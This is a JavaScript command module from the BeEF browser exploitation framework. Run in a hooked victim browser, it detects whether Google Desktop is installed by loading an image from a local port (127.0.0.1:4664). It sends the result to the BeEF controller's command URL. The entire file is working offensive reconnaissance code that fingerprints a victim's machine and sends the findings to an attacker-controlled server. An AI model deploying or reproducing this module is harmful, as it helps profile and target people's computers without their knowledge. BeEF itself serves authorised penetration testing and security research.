//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://127.0.0.1:4664/logo3.gif";
	img.onload = function() { beef.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Installed', beef.are.status_success());dom.removeChild(this); }
	img.onerror = function() { beef.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Not Installed', beef.are.status_error());dom.removeChild(this); }
	dom.appendChild(img);

});

